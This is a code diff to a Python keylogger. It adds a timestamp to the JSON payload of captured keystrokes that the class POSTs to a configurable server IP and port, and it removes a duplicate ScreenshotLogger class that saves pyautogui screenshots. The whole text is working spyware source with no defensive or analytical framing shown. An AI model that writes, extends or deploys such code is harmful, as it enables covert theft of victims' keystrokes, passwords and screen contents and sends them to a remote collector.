@@ -27,7 +27,11 @@ class KeyLogger:
             '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?' 
         }
     def _send_post_request(self):
-        payload = json.dumps({"keyboardData": self.text})
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        payload = json.dumps({
+            "timestamp": timestamp,
+            "keyboardData": self.text
+            })
         try:
             requests.post(f"http://{self.server_ip}:{self.port}", 
                           data=payload, 
@@ -88,22 +92,6 @@ class KeyLogger:
                                on_release=self._on_release
         ) as listener:
             listener.join()
-
-class ScreenshotLogger:
-    def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
-        self.interval = interval
-        self.server_ip = server_ip
-        self.port = port
- 
-    def _generate_name(self):
-        rand = ''. join (random.choices(string.ascii_uppercase + string.digits, k=7))
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        return f"screenshot_{rand}_{timestamp}.png"
-
-    def take_screenshot(self):
-        filename = self._generate_name()
-        pyautogui.screenshot().save(filename)
-        return filename
     
 class ScreenshotLogger:
     def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
